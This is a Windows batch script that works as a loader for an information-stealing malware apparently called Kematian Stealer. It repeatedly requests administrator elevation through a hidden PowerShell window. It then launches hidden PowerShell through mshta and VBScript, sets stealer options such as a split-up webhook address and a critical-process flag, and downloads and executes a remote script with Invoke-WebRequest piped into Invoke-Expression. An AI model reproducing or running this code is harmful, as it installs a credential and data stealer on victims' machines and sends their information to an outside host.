@echo off
cd /d "%~dp0"
net session >nul 2>&1
if NOT %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$webhook = 'h' + 'ttps://full-recording.gl.at.ply.gg:14817/data';$debug=$false;$vm_protect=$false;$encryption_key = 'YOUR_ENC_KEY_HERE';$blockhostsfile=$false;$criticalprocess=$true;$melt=$false;$fakeerror=$false;$persistence=$false;$write_disk_only = $false;$t = Iwr -Uri 'https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/main.ps1' -USeB | iex",0))